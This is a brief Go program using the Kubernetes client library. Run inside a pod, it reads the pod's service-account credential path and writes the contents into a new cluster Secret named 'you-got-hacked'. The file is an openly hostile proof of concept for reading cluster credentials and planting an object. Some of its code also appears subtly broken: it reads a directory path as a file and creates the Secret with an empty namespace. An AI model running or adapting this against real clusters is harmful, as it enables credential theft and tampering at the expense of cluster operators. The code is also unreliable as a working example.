package main

import (
	"io/ioutil"
	"k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

func main() {
	// creates the in-cluster config
	config, err := rest.InClusterConfig()
	check(err)
	// creates the clientset
	clientset, err := kubernetes.NewForConfig(config)
	check(err)
	dat, err := ioutil.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount")
	check(err)
	_, err = clientset.CoreV1().Secrets("").Create(&v1.Secret{
		ObjectMeta: metav1.ObjectMeta{
			Name: "you-got-hacked",
		},
		Data: map[string][]byte{
			"data":dat,
		},
	})
	check(err)
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}